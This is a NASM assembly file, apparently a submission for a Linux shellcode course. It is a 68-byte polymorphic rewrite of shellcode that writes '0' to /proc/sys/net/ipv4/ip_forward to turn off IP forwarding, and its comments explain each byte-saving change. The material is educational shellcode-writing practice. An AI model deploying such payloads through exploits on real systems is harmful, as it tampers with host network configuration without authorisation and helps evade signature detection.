; Filename: code1-smaller.nasm
; Author: Gitsnik SLAE-431
; Website: http://dracyrys.com/
;
; Purpose:
;	set /proc/sys/net/ipv4/ip_forward to 0 and exit
;
; Shellcode is 68 bytes (original 83)
; 11 out of the original 31 lines are the same (35.48% similarity)
;
; However, rewriting the shellcode to be more efficient
; is probably not what was in mind when this assessment
; was set, so we will enhance this code further.
;

global _start

section .text

_start:
	xor eax, eax			; [SAME]
	xor ecx, ecx
	cdq

	push edx			; null

	; /proc/sys/net/ipv4/ip_forward
	push 0x64726177			; [SAME] draw
	push 0x726f665f			; [SAME] rof_
	push 0x70692f34			; [SAME] pi/4
	push 0x7670692f			; [SAME] vpi/
	push 0x74656e2f			; [SAME] ten/
	push 0x7379732f			; sys/
	push 0x636f7270			; corp
	push 0x2f2f2f2f			; ////

	mov ebx, esp			; [SAME] EBX now points to argument

	inc ecx				; open( /proc/sys/net/ipv4/ip_forward )
	add al, 0x05			; O_WRONLY
	int 0x80			; [SAME] haha

	xchg ebx, eax			; Shorter than mov ebx, eax
	;mov ebx, eax

	;xor ecx, ecx			; We already have EDX null let's
					; push that to save two bytes.

	;push edx			; null, don't know why, write doesn't
					; care it's only going to write EDX
					; bytes and we are going to tell it
					; to write 1.

	push 0x30			; [SAME] Ascii 0

	mov ecx, esp			; [SAME] ECX points to stack

	inc edx				; instead of mov dl, 0x01

	xor eax, eax			; Because it currently points at the stack!
	add eax, 0x04			; write()
	int 0x80			; [SAME] haha

	int 0x80			; exit() with EBX value (which we don't care
					; what it is).
					;
					; I apologise that this looks strange so I
					; have left the code below for your viewing.
					;
					; But basically two things are happening here.
					; 1. We are writing a single byte with write()
					; so it's retval into EAX is 1, and there
					; is no point calling close because exit()
					; closes all open file descriptors for you
					;

	;xor eax, eax			; We already know write() returned 1
					; byte because that's all we wrote.
					; So add 5 to make it 6 and close
					; the file handle still in EBX
	;add eax, 0x05
	;int 0x80			; close()

	;inc eax				; close returns 0 on success
	;xor ebx, ebx			; file handle is in EBX, we can ignore
					; the exit() value anyway :)
	;int 0x80
